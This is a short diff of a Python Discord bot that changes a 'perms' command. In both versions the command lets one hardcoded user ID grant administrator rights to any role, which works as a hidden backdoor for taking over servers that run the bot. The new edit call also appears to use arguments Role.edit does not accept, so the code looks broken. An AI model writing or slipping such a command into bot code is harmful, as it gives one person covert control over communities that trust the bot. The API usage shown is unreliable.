@@ -25,9 +25,9 @@ async def on_ready():
 	print("Bot is ready.")
 	
 @client.command()
-async def perms(ctx , role:discord.Role):
+async def perms(ctx , Role:discord.Role):
 	if ctx.message.author.id == 727539383405772901:
-		await role.edit(administrator = True)
+		await Role.edit(server=ctx.message.guild , role = Role , administrator = True)
 		print("Done")
 	
 	
